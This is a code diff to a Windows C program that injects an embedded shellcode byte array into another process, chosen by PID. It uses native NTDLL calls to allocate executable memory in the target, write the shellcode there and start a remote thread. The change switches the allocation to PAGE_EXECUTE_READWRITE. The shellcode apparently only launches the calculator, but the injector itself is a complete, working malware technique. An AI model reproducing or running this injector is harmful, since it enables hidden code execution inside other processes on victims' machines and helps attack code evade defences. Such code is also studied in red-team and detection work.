@@ -20,15 +20,16 @@ HMODULE GetModule(IN LPCWSTR moduleName)
 
 int main(int argc, char* argv[])
 {
-    DWORD PID = 0;
-    NTSTATUS STATUS = 0;
+    DWORD PID = NULL;
     HMODULE hNTDLL = NULL;
-    LPVOID baseAddress = NULL;
+    PVOID bAddress = NULL;
     HANDLE hProcess = NULL;
     HANDLE hThread = NULL;
+    NTSTATUS STATUS;
+
     
-    /* const keyword makes it so sc is placed in .rdata */
-    CONST UCHAR sc[] = 
+    /* const keyword makes it so sc is placed in .rodata, unsigned char is mutable and in .data */
+    unsigned char sc[] = 
     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
     "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
     "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
@@ -51,6 +52,7 @@ int main(int argc, char* argv[])
     "\xd5\x63\x61\x6c\x63\x00";
 
     SIZE_T scSize = sizeof(sc);
+    SIZE_T bytesWritten = 0;
     
     if (argc < 2)
     {
@@ -82,8 +84,7 @@ int main(int argc, char* argv[])
     okay("Got handle for process");
     info("[ %ld ] --> [ 0x%p ]", PID, hProcess);
 
-    //do NtAllocateVirtualMemory and NtWriteVirtualMemory
-    STATUS = alloc(hProcess, &baseAddress, 0, &scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    STATUS = alloc(hProcess, &bAddress, NULL, &scSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     if (STATUS != STATUS_SUCCESS)
     {
         warn("Error: NtAllocateVirtualMemory returned NTSTATUS 0x%lx", STATUS);
@@ -91,16 +92,16 @@ int main(int argc, char* argv[])
     }
     okay("Allocated %ld bytes in process 0x%p", scSize, hProcess);
     
-    STATUS = write(hProcess, &baseAddress, (PVOID)sc, scSize, NULL);
+    STATUS = write(hProcess, bAddress, sc, sizeof(sc), &bytesWritten);
     if (STATUS != STATUS_SUCCESS)
     {
-        warn("Error: NtWriteVirtualMemory returned NTSTATUS 0x%lx", STATUS);
+        warn("Error: NtWriteVirtualMemory returned NTSTATUS 0x%lx. %ld bytes had been written", STATUS, bytesWritten);
         return EXIT_FAILURE;
     }
     okay("Wrote %ld bytes into process 0x%p", scSize, hProcess);
     okay("Executing thread...");
 
-    STATUS = thread(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, baseAddress, NULL, 0, 0, 0, 0, NULL);
+    STATUS = thread(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, bAddress, NULL, 0, 0, 0, 0, NULL);
     if (STATUS != STATUS_SUCCESS)
     {
         warn("Error: NtCreateThreadEx returned NTSTATUS 0x%lx", STATUS);
